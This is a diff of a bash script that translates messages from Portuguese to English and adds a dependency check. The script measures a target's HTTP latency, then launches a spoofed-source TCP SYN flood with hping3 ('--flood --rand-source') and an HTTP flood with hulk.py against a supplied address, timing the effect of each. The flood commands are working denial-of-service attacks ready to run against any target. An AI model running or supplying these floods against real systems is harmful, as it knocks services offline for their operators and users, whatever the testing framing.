@@ -5,47 +5,57 @@ pingu()
 	IP=$1
 	REP=$2
 	PRINT=$3
-	echo "Calculando tempo de conexao para $IP..."
+	echo "Calculating time to $IP... "
 	httping $IP -c $REP > temp_httping.txt
-	echo "Tempo $PRINT" `tail -n 1 temp_httping.txt | awk '{print $4}' | cut -d"/" -f2`
+	echo "$PRINT " `tail -n 1 temp_httping.txt | awk '{print $4}' | cut -d"/" -f2`
 
 }
 
-[ $1 ] && [ $2 ] || { echo "Uso: $0 <ip> <repeticoes>";exit; }
+[ $1 ] && [ $2 ] || {
+	echo ""
+	echo "Usage: sudo bash $0 <url> <reps>"
+	exit
+	}
 
 IP=$1
 REP=$2
 
+for CMD in xterm httping hping3
+do
+	if [ ! `which $CMD` ]
+	then
+		echo ""
+		echo "[ERROR] Missing command/app \"$CMD\". Install  it first"
+		echo ""
+		echo "try: sudo apt install $CMD -y"
+		echo ""
+		exit
+	fi
+done
 
-echo "============================="
-pingu $IP $REP "medio:"
-echo "============================="
+pingu $IP $REP "Average time (in ms):"
+
 
 echo ""
-echo "Proximo teste: TCP SYN FLOOD"
-echo ""
-
+echo "Next test: TCP SYN FLOOD with hping3"
+echo -n "Starting... "
 sleep 5
 
-echo "============================="
-echo "Ataque TCP SYN FLOOD iniciado"
+echo "GO!"
 xterm -e "sudo hping3 -c 15000 -d 120 -S -w 512 -p 80 --flood --rand-source $IP" &
 sleep 5
-pingu $IP $REP "medio com tcp syn flood:"
+pingu $IP $REP "Average time with TCP SYN FLOOD (in ms):"
 
 sleep 10
 
-echo "============================="
 echo ""
-echo "Proximo teste: hulk"
-echo ""
+echo "Next test: Flooding atack with hulk."
+echo -n "Starting..."
+echo "Smash!"
 
-echo "============================="
-echo "Ataque hulk iniciado"
 xterm -e "python hulk.py $IP" &
 sleep 3
-pingu $IP $REP "medio com ataque hulk:"
-echo "============================="
+pingu $IP $REP "Average time with Flooding (in ms):"
 bash hulk-buster.sh
 
 
